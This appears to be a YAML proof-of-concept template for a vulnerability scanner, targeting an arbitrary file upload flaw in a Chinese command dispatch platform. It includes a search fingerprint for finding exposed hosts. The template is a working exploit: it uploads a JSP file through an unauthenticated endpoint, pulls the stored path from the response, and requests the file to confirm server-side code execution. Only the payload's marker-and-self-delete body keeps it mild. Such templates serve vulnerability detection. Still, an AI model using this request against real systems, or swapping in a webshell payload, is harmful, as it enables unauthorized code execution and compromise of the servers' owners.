id: poc-yaml-command-dispatch-platform-upload-anyfile-upload
info:
  name: 可视化融合指挥调度平台 upload 任意文件上传漏洞
  severity: critical
  tags:
  - 任意上传
  finger: 可视化融合指挥调度平台
  fofa: body="base/searchInfoWindow_min.css"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /dm/dispatch/user/upload
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
  data: '------WebKitFormBoundary7ctER307B0RaQwOp

    Content-Disposition: form-data; name="file";filename="{{.t1}}.jsp"


    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundary7ctER307B0RaQwOp--'
  expression: status_code == 200 && contains(body,"success")
  output:
  - regex_match(body,"/media/medias/(?P<path>.*?).jsp")
- method: GET
  path: /media/medias/{{.path}}.jsp
  expression: status_code == 200 && body == t2
transport: http
